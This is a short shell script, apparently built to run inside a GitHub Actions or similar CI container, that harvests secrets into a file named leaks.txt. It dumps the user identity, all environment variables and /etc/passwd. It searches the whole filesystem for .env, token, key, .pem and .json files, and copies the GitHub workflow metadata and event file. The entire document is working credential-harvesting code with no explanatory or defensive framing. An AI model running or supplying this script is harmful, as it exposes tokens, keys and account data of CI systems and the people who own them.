mkdir -p /output && \
echo "## USER & ENV" > /output/leaks.txt && \
id >> /output/leaks.txt && whoami >> /output/leaks.txt && env >> /output/leaks.txt && \
echo "## FILES & SECRETS" >> /output/leaks.txt && \
find / -type f -name '*.env' -o -name '*token*' -o -name '*.key' -o -name '*.pem' -o -name '*.json' 2>/dev/null >> /output/leaks.txt && \
cat /etc/passwd >> /output/leaks.txt && \
echo "## GITHUB METADATA" >> /output/leaks.txt && \
ls -alhR /github | tee -a /output/leaks.txt && \
cat /github/workflow/event.json >> /output/leaks.txt 2>/dev/null || true
